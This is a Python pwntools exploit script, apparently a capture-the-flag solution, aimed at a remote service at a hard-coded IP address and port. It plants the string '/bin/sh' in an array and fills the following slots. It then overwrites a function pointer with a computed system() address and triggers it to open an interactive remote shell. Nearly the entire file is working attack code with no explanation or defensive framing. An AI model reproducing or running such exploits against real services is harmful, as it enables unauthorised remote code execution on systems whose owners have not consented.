#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 109.233.56.90 --port 11635
from pwn import *
from Crypto.Util.number import bytes_to_long 
# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11635)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

sys_addr = 0x7ffff7e05000 + 0x48F20

io.recvuntil(b'\n\n')

# arr[0] = b'/bin/sh\x00'
io.send(b'1\n')
io.recvuntil(b'Enter your number:\n')
io.sendline(str(bytes_to_long(b'/bin/sh\x00'[::-1])).encode())

# trash
for i in range(10):
    io.send(b'1\n')
    io.recvuntil(b'Enter your number:\n')
    io.sendline(b'0')

# hz
io.send(b'1\n')
io.recvuntil(b'Enter your number:\n')
io.sendline(b'0')

# input
io.send(b'1\n')
io.recvuntil(b'Enter your number:\n')
io.sendline(b'0')

# ptr_foo
io.send(b'1\n')
io.recvuntil(b'Enter your number:\n')
io.sendline(str(sys_addr).encode())


# system("/bin/sh")
io.send(b'2\n')


io.interactive()